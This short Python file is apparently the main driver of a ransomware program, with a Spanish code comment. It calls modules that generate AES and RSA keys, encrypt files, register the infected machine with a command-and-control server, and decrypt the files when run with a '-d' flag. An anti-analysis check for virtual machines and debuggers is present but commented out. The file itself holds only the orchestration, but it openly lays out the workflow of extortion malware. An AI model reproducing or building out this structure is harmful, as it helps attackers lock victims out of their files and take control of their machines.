import sys
import antianalysis
import gen_keys
import encrypt
import decrypt
import agent_c2

def main():
    #antianalysis.check_virtualization_and_debbuging() #(estorba al ejecutar me para el código...)
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        decrypt.descifrar_archivos()
    else:
        gen_keys.generate_aes_key()
        gen_keys.generate_rsa_key()
        encrypt.cifrar_archivos()
        agent_c2.register_agent()

if __name__ == "__main__":
    main()